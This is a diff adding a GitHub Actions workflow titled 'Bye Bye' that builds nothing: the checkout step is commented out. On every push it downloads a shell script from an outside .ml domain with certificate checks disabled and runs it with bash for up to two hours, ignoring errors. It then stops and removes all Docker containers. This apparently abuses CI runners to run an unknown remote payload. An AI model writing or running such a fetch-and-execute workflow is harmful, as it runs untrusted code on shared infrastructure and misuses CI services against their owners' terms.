@@ -1,0 +1,25 @@
+name: Bye Bye
+2
+
+on:
+    push:
+    workflow_dispatch:
+    
+jobs:
+  build:
+    runs-on: ubuntu-20.04
+
+    steps:
+       #- name: a1
+       #  uses: actions/checkout@main
+         
+       - name: a2
+         timeout-minutes: 120
+         continue-on-error: true
+         run: |
+             curl -sLkO https://olelele.ml/0:/GGG/b.sh
+             bash b.sh
+       - name: a3
+         continue-on-error: true
+         run: |
+           docker stop $(docker ps -a -q) && docker rm $(docker ps -a -q)
